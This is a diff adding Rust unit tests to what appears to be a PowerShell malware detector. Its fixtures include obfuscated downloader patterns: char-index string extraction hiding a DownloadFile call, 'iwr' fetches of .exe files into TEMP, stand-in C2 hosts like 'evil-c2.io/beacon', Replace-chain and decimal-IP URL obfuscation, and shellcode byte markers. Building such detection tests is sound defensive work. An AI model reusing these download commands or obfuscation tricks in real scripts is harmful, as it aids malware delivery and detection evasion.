     #[test]
@@ -6042,6 +11865,80 @@ mod ps_char_index_extractor_tests {
             "expected shalouxt.top URL; got {:?}",
             extracted
         );
+    }
+
+    #[test]
+    fn extractor_download_context_promotes_url_to_download() {
+        let url = "https://ps-char-context.example/stage.bin";
+        let download_call = "$wc.DownloadFile($url,$dst)";
+        let script = format!(
+            r#"
+            function Pick ($p){{
+                $i=1;
+                do {{ $r+=$p[$i]; $i+=2; $noise=Compare-Object alpha beta; }}
+                until (!$p[$i])
+                $r
+            }}
+            $url = Pick '{}'
+            Pick '{}'
+        "#,
+            pad_extracted(url),
+            pad_extracted(download_call)
+        );
+
+        let traits = traits(&script);
+        assert!(
+            traits.iter().any(|t| matches!(t,
+                Trait::Download { src, .. } if src == url
+            )),
+            "expected structured Download from decoded download context; got {:?}",
+            traits
+        );
+        assert!(
+            !traits.iter().any(|t| matches!(t,
+                Trait::DownloadInDeobText { src, .. } if src == url
+            )),
+            "decoded download context should not leave only a generic URL trait: {:?}",
+            traits
+        );
+    }
+
+    #[test]
+    fn prefilter_allows_index_extractor_shape() {
+        let script = r#"
+            function Musculos ($filmprod){
+                $overill=3;
+                do { $sirp+=$filmprod[$overill]; $overill+=4; }
+                until (!$filmprod[$overill])
+                $sirp
+            }
+        "#;
+
+        assert!(has_ps_char_index_extractor_atom(script));
+    }
+
+    #[test]
+    fn prefilter_blocks_function_without_index_extraction() {
+        let script = r#"
+            function Sum ($n){ $i=0; do { $s+=1; $i+=1 } until ($i -ge $n) $s }
+            $x = Sum 5
+        "#;
+
+        assert!(!has_ps_char_index_extractor_atom(script));
+    }
+
+    #[test]
+    fn prefilter_blocks_index_math_without_do_until_extractor_loop() {
+        let script = r#"
+            function MaybeIndexer ($p){
+                $i=3;
+                $r += $p[$i];
+                $i += 4;
+                $r
+            }
+        "#;
+
+        assert!(!has_ps_char_index_extractor_atom(script));
     }
 
     #[test]
@@ -6073,7 +11970,7 @@ mod ps_char_index_extractor_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod ps_bare_url_download_tests {
-    use super::scan_ps_bare_url_downloads;
+    use super::{has_ps_bare_url_download_atom, scan_ps_bare_url_downloads};
     use crate::env::Environment;
     use crate::traits::Trait;
     use crate::Config;
@@ -6098,6 +11995,18 @@ mod ps_bare_url_download_tests {
     }
 
     #[test]
+    fn iwr_short_uri_bare_host_synthesizes_http_prefix() {
+        let s = r#"iwr -Ur 'rebrand.ly/shorturi' -OutFile $env:TEMP\f.exe"#;
+        assert_eq!(urls(s), vec!["http://rebrand.ly/shorturi".to_string()]);
+    }
+
+    #[test]
+    fn iwr_colon_bound_short_uri_bare_host_synthesizes_http_prefix() {
+        let s = r#"iwr -Ur:'rebrand.ly/colonuri' -OutFile $env:TEMP\f.exe"#;
+        assert_eq!(urls(s), vec!["http://rebrand.ly/colonuri".to_string()]);
+    }
+
+    #[test]
     fn start_process_bare_host_synthesizes_http_prefix() {
         // MICROSOFT_OFFICE_EXCEL_A.vbs corpus shape.
         let s = r#"Start-Process 'goingupdate.com/ptoleqco'"#;
@@ -6108,6 +12017,35 @@ mod ps_bare_url_download_tests {
     fn invoke_restmethod_bare_host_works_too() {
         let s = r#"Invoke-RestMethod 'evil-c2.io/beacon'"#;
         assert_eq!(urls(s), vec!["http://evil-c2.io/beacon".to_string()]);
+    }
+
+    #[test]
+    fn quoted_bare_host_without_path_still_synthesizes_http_prefix() {
+        let s = r#"Start-Process 'evil-c2.io'"#;
+        assert_eq!(urls(s), vec!["http://evil-c2.io".to_string()]);
+    }
+
+    #[test]
+    fn prefilter_allows_supported_quoted_ps_download_invocations() {
+        assert!(has_ps_bare_url_download_atom(
+            r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#
+        ));
+        assert!(has_ps_bare_url_download_atom(
+            r#"Start-Process "goingupdate.com/ptoleqco""#
+        ));
+        assert!(has_ps_bare_url_download_atom(
+            r#"Invoke-RestMethod 'evil-c2.io/beacon'"#
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_generic_dotted_powershell_text() {
+        assert!(!has_ps_bare_url_download_atom(
+            r#"$s = New-Object -ComObject 'Wscript.Shell'"#
+        ));
+        assert!(!has_ps_bare_url_download_atom(
+            r#"Start-Process microsoft.com"#
+        ));
     }
 
     #[test]
@@ -6127,6 +12065,32 @@ mod ps_bare_url_download_tests {
         // bare arg list but is too risky without quotes.
         let s = r#"Start-Process microsoft.com"#;
         assert!(urls(s).is_empty(), "should require quotes");
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod ps_replace_chain_url_prefilter_tests {
+    use super::has_ps_replace_chain_url_atom;
+
+    #[test]
+    fn prefilter_allows_replace_chain_url_markers() {
+        assert!(has_ps_replace_chain_url_atom(
+            r#"$u='htxp://evil.example/p'; $u=$u.Replace('x','t')"#
+        ));
+        assert!(has_ps_replace_chain_url_atom(
+            r#"$u='quwdevil.example/p'; $u=$u -replace 'quwd','https://'"#
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_replace_without_url_template() {
+        assert!(!has_ps_replace_chain_url_atom(
+            r#"$name = $name.Replace('a','b')"#
+        ));
+        assert!(!has_ps_replace_chain_url_atom(
+            r#"Write-Host 'hxxp://example.invalid/no-replace-call'"#
+        ));
     }
 }
 
@@ -6195,7 +12159,7 @@ mod inline_b64_url_extraction_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod shellcode_marker_tests {
-    use super::scan_shellcode_marker;
+    use super::{has_shellcode_marker_atom, scan_shellcode_marker};
     use crate::env::Environment;
     use crate::traits::Trait;
     use crate::Config;
@@ -6210,6 +12174,27 @@ mod shellcode_marker_tests {
                 _ => None,
             })
             .collect()
+    }
+
+    #[test]
+    fn prefilter_allows_shellcode_marker_shapes() {
+        for sample in [
+            r#"$shellCode = @(0x41,0x42)"#,
+            r#"$buf = "A" + "\x90\x90\x90\x90\x90\x90\x90\x90""#,
+            r#"$buf = 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90"#,
+            r#"[Byte[]] $BqFIleukW = 0xfc,0x48,0x83,0xe4,0xf0"#,
+            r#"[Byte[]] $sc = 0XFC,0XE8,0x82"#,
+        ] {
+            assert!(has_shellcode_marker_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_hex_and_powershell_text() {
+        assert!(!has_shellcode_marker_atom(
+            r#"$bytes = 0x41,0x42,0x43; Write-Host done"#,
+        ));
+        assert!(!has_shellcode_marker_atom("powershell -nop -w hidden"));
     }
 
     #[test]
@@ -6332,10 +12317,17 @@ mod decimal_ip_url_tests {
         env.traits
             .iter()
             .filter_map(|t| match t {
+                Trait::Download { src, .. } => Some(src.clone()),
                 Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                 _ => None,
             })
             .collect()
+    }
+
+    fn run_and_collect_traits(deob: &str) -> Vec<Trait> {
+        let mut env = Environment::new(&Config::default());
+        scan_decimal_ip_urls(deob, &mut env);
+        env.traits
     }
 
     #[test]
@@ -6343,6 +12335,25 @@ mod decimal_ip_url_tests {
         // 1297338337 = 0x4D53CFE1 = 77.83.207.225
         let urls = run_and_collect_urls("Invoke-WebRequest 1297338337/x.jpg");
         assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
+    }
+
+    #[test]
+    fn ps_invoke_webrequest_decimal_ip_emits_structured_download() {
+        let traits = run_and_collect_traits("Invoke-WebRequest 1297338337/x.jpg");
+        assert!(
+            traits.iter().any(|t| matches!(t,
+                Trait::Download { src, .. } if src == "http://77.83.207.225/x.jpg"
+            )),
+            "decimal-IP Invoke-WebRequest should emit Download: {:?}",
+            traits
+        );
+        assert!(
+            !traits.iter().any(|t| matches!(t,
+                Trait::DownloadInDeobText { src, .. } if src == "http://77.83.207.225/x.jpg"
+            )),
+            "decimal-IP Invoke-WebRequest should not stay generic: {:?}",
+            traits
+        );
     }
 
     #[test]
